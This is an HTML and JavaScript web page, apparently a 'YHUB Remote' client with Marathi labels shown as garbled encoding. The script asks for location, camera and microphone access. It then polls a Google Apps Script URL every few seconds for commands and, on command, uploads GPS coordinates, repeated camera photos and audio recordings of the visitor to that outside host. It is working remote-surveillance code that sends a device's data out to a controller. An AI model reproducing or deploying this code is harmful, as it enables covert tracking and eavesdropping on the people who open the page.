<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>YHUB Remote ‚Ä¢ Client</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body {
            background: #0a0c10;
            color: #e0e0e0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container {
            max-width: 500px;
            width: 100%;
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 1rem;
            text-align: center;
        }
        .card {
            background: #161b22;
            border-radius: 24px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #30363d;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .device-code {
            background: #0d1117;
            padding: 1rem;
            border-radius: 40px;
            text-align: center;
            font-size: 0.9rem;
            color: #8b949e;
            border: 1px solid #30363d;
            margin-bottom: 1.5rem;
            word-break: break-all;
        }
        .permission-buttons {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin: 1.5rem 0;
        }
        .btn {
            padding: 14px;
            border: none;
            border-radius: 40px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.2s;
            background: #21262d;
            color: #fff;
            border: 1px solid #30363d;
        }
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
        }
        .btn-success {
            background: linear-gradient(135deg, #34d399 0%, #10b981 100%);
            border: none;
        }
        .btn-danger {
            background: linear-gradient(135deg, #f87171 0%, #ef4444 100%);
            border: none;
        }
        .status {
            background: #0d1117;
            padding: 1rem;
            border-radius: 40px;
            text-align: center;
            font-size: 0.9rem;
            color: #8b949e;
            border: 1px solid #30363d;
            margin: 1rem 0;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #30363d;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .footer {
            margin-top: 2rem;
            color: #8b949e;
            font-size: 0.8rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üì± YHUB REMOTE CLIENT</h1>
        
        <div class="card" id="client-card">
            <div class="device-code" id="device-code">‡§ï‡•ã‡§° ‡§Æ‡§ø‡§≥‡§§ ‡§Ü‡§π‡•á...</div>
            
            <div class="status" id="status">‚ö™ ‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§π‡•ã‡§§ ‡§Ü‡§π‡•á...</div>
            
            <div class="permission-buttons" id="permission-buttons">
                <button class="btn btn-primary" onclick="requestAllPermissions()">üîê ‡§∏‡§∞‡•ç‡§µ ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§¶‡•ç‡§Ø‡§æ</button>
            </div>
            
            <div style="display: flex; gap: 10px; margin-top: 1rem;">
                <button class="btn btn-success" style="flex:1;" onclick="startCamera()">üì∏ ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§∏‡•Å‡§∞‡•Ç</button>
                <button class="btn btn-danger" style="flex:1;" onclick="stopCamera()">‚èπÔ∏è ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§¨‡§Ç‡§¶</button>
            </div>
            
            <div style="display: flex; gap: 10px; margin-top: 1rem;">
                <button class="btn btn-success" style="flex:1;" onclick="startAudio()">üé§ ‡§ë‡§°‡§ø‡§ì ‡§∏‡•Å‡§∞‡•Ç</button>
                <button class="btn btn-danger" style="flex:1;" onclick="stopAudio()">‚èπÔ∏è ‡§ë‡§°‡§ø‡§ì ‡§¨‡§Ç‡§¶</button>
            </div>
            
            <div style="margin-top: 1rem;">
                <button class="btn btn-primary" style="width:100%;" onclick="sendLocation()">üìç ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§™‡§æ‡§†‡§µ‡§æ</button>
            </div>
            
            <div id="debug" style="margin-top: 1rem; font-size: 0.8rem; color: #8b949e; text-align: center;"></div>
        </div>
        
        <div class="footer">
            Y HUB REMOTE v3.0 ‚Ä¢ GitHub Edition
        </div>
    </div>

    <script>
        // ---------- ‡§ï‡•â‡§®‡•ç‡§´‡§ø‡§ó‡§∞‡•á‡§∂‡§® ----------
        const GSHEET_URL = 'https://script.google.com/macros/s/AKfycbyrhp5yU-hyxrQx6OWZDKH4-qZekJgko7wRXvLOypEd-94uJfGWFp8K5DH6cI6U_XSP/exec';
        
        // URL ‡§Æ‡§ß‡•Ç‡§® device code ‡§Æ‡§ø‡§≥‡§µ‡§æ
        const urlParams = new URLSearchParams(window.location.search);
        const deviceCode = urlParams.get('code') || localStorage.getItem('yhub_device_code') || 'dev_' + Math.random().toString(36).substring(2, 10);
        
        // ‡§≤‡•ã‡§ï‡§≤ ‡§∏‡•ç‡§ü‡•ã‡§∞‡•á‡§ú‡§Æ‡§ß‡•ç‡§Ø‡•á ‡§∏‡•á‡§µ‡•ç‡§π ‡§ï‡§∞‡§æ
        localStorage.setItem('yhub_device_code', deviceCode);
        
        // ‡§ó‡•ç‡§≤‡•ã‡§¨‡§≤ ‡§µ‡•ç‡§π‡•á‡§∞‡§ø‡§è‡§¨‡§≤‡•ç‡§∏
        let cameraInterval = null;
        let mediaRecorder = null;
        let audioChunks = [];
        let lastCommand = null;
        
        // ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ ‡§ï‡•ã‡§° ‡§¶‡§æ‡§ñ‡§µ‡§æ
        document.getElementById('device-code').innerHTML = `üì± ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏ ‡§ï‡•ã‡§°: <strong>${deviceCode}</strong>`;
        
        // ---------- ‡§∏‡§∞‡•ç‡§µ ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§Æ‡§æ‡§ó‡§æ ----------
        async function requestAllPermissions() {
            document.getElementById('status').innerHTML = 'üì° ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§Æ‡§æ‡§ó‡§ø‡§§‡§≤‡•ç‡§Ø‡§æ ‡§ú‡§æ‡§§ ‡§Ü‡§π‡•á‡§§...';
            
            try {
                // ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                });
                
                // ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§Ü‡§£‡§ø ‡§Æ‡§æ‡§Ø‡§ï‡•ç‡§∞‡•ã‡§´‡•ã‡§® ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                stream.getTracks().forEach(track => track.stop());
                
                document.getElementById('status').innerHTML = '‚úÖ ‡§∏‡§∞‡•ç‡§µ ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•ç‡§Ø‡§æ ‡§Æ‡§ø‡§≥‡§æ‡§≤‡•ç‡§Ø‡§æ!';
                document.getElementById('permission-buttons').style.display = 'none';
                
            } catch (err) {
                document.getElementById('status').innerHTML = `‚ùå ‡§™‡§∞‡§µ‡§æ‡§®‡§ó‡•Ä ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä: ${err.message}`;
            }
        }
        
        // ---------- ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡•á‡§ï ‡§ï‡§∞‡§£‡•ç‡§Ø‡§æ‡§∏‡§æ‡§†‡•Ä ‡§™‡•ã‡§≤‡§ø‡§Ç‡§ó ----------
        async function checkCommands() {
            try {
                const response = await fetch(GSHEET_URL);
                const data = await response.json();
                
                // ‡§Ø‡§æ ‡§°‡§ø‡§µ‡•ç‡§π‡§æ‡§á‡§∏‡§ö‡•ç‡§Ø‡§æ pending ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§∂‡•ã‡§ß‡§æ
                const pendingCommands = data.filter(row => 
                    row.device_code === deviceCode && 
                    row.status === 'pending' &&
                    ['location', 'photo', 'audio', 'stop'].includes(row.cmd_type)
                );
                
                if (pendingCommands.length > 0) {
                    const cmd = pendingCommands[pendingCommands.length - 1];
                    lastCommand = cmd.cmd_type;
                    
                    document.getElementById('status').innerHTML = `üì© ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§Æ‡§ø‡§≥‡§æ‡§≤‡•Ä: ${cmd.cmd_type}`;
                    
                    if (cmd.cmd_type === 'location') {
                        sendLocation();
                    } else if (cmd.cmd_type === 'photo') {
                        startCamera();
                    } else if (cmd.cmd_type === 'audio') {
                        startAudio();
                    } else if (cmd.cmd_type === 'stop') {
                        stopCamera();
                        stopAudio();
                    }
                }
            } catch (err) {
                console.error('‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡•á‡§ï ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä:', err);
            }
        }
        
        // ---------- ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§™‡§æ‡§†‡§µ‡§æ ----------
        function sendLocation() {
            if (!navigator.geolocation) {
                alert('‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§∏‡§™‡•ã‡§∞‡•ç‡§ü ‡§®‡§æ‡§π‡•Ä');
                return;
            }
            
            document.getElementById('status').innerHTML = 'üìç ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§Æ‡§ø‡§≥‡§µ‡§§ ‡§Ü‡§π‡•á...';
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const data = {
                        device_code: deviceCode,
                        cmd_type: 'location',
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        status: 'executed'
                    };
                    
                    sendToSheet(data);
                    document.getElementById('status').innerHTML = '‚úÖ ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§™‡§æ‡§†‡§µ‡§≤‡•Ä!';
                },
                (error) => {
                    document.getElementById('status').innerHTML = `‚ùå ‡§≤‡•ã‡§ï‡•á‡§∂‡§® ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä: ${error.message}`;
                }
            );
        }
        
        // ---------- ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§∏‡•Å‡§∞‡•Ç ‡§ï‡§∞‡§æ ----------
        function startCamera() {
            if (cameraInterval) return;
            
            document.getElementById('status').innerHTML = 'üì∏ ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§∏‡•Å‡§∞‡•Ç...';
            
            cameraInterval = setInterval(async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment' } 
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                        
                        sendToSheet({
                            device_code: deviceCode,
                            cmd_type: 'photo',
                            photo_base64: base64,
                            status: 'executed'
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                        document.getElementById('status').innerHTML = 'üì∏ ‡§´‡•ã‡§ü‡•ã ‡§™‡§æ‡§†‡§µ‡§≤‡§æ';
                    }, 500);
                    
                } catch (err) {
                    document.getElementById('status').innerHTML = `‚ùå ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä: ${err.message}`;
                }
            }, 2000); // ‡§¶‡§∞ 2 ‡§∏‡•á‡§ï‡§Ç‡§¶‡§æ‡§Ç‡§®‡•Ä ‡§´‡•ã‡§ü‡•ã
        }
        
        function stopCamera() {
            if (cameraInterval) {
                clearInterval(cameraInterval);
                cameraInterval = null;
                document.getElementById('status').innerHTML = '‚èπÔ∏è ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ ‡§•‡§æ‡§Ç‡§¨‡§µ‡§≤‡§æ';
            }
        }
        
        // ---------- ‡§ë‡§°‡§ø‡§ì ‡§∞‡•á‡§ï‡•â‡§∞‡•ç‡§°‡§ø‡§Ç‡§ó ----------
        async function startAudio() {
            if (mediaRecorder) return;
            
            audioChunks = [];
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = (e) => {
                    audioChunks.push(e.data);
                };
                
                mediaRecorder.onstop = () => {
                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    
                    reader.onloadend = () => {
                        const base64 = reader.result.split(',')[1];
                        sendToSheet({
                            device_code: deviceCode,
                            cmd_type: 'audio',
                            audio_base64: base64,
                            status: 'executed'
                        });
                        document.getElementById('status').innerHTML = 'üé§ ‡§ë‡§°‡§ø‡§ì ‡§™‡§æ‡§†‡§µ‡§≤‡§æ';
                    };
                    
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                document.getElementById('status').innerHTML = 'üé§ ‡§ë‡§°‡§ø‡§ì ‡§∞‡•á‡§ï‡•â‡§∞‡•ç‡§° ‡§π‡•ã‡§§ ‡§Ü‡§π‡•á...';
                
                // 5 ‡§∏‡•á‡§ï‡§Ç‡§¶‡§æ‡§Ç‡§®‡•Ä ‡§•‡§æ‡§Ç‡§¨‡§µ‡§æ
                setTimeout(stopAudio, 5000);
                
            } catch (err) {
                document.getElementById('status').innerHTML = `‚ùå ‡§ë‡§°‡§ø‡§ì ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä: ${err.message}`;
            }
        }
        
        function stopAudio() {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
                mediaRecorder = null;
            }
        }
        
        // ---------- Google Sheets ‡§≤‡§æ ‡§°‡•á‡§ü‡§æ ‡§™‡§æ‡§†‡§µ‡§æ ----------
        async function sendToSheet(data) {
            try {
                const response = await fetch(GSHEET_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(data)
                });
            } catch (err) {
                console.error('‡§∂‡•Ä‡§ü ‡§§‡•ç‡§∞‡•Å‡§ü‡•Ä:', err);
            }
        }
        
        // ---------- Service Worker (‡§ë‡§´‡§≤‡§æ‡§á‡§® ‡§∏‡§™‡•ã‡§∞‡•ç‡§ü) ----------
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js').catch(err => console.log('SW error:', err));
        }
        
        // ---------- ‡§á‡§®‡§ø‡§∂‡§ø‡§Ø‡§≤‡§æ‡§Ø‡§ù‡•á‡§∂‡§® ----------
        requestAllPermissions();
        setInterval(checkCommands, 3000); // ‡§¶‡§∞ 3 ‡§∏‡•á‡§ï‡§Ç‡§¶‡§æ‡§Ç‡§®‡•Ä ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§§‡§™‡§æ‡§∏‡§æ
        
        // ‡§™‡•á‡§ú ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡§§‡§æ‡§®‡§æ ‡§ï‡•Ö‡§Æ‡•á‡§∞‡§æ/‡§ë‡§°‡§ø‡§ì ‡§•‡§æ‡§Ç‡§¨‡§µ‡§æ
        window.addEventListener('beforeunload', () => {
            stopCamera();
            stopAudio();
        });
    </script>
</body>
</html>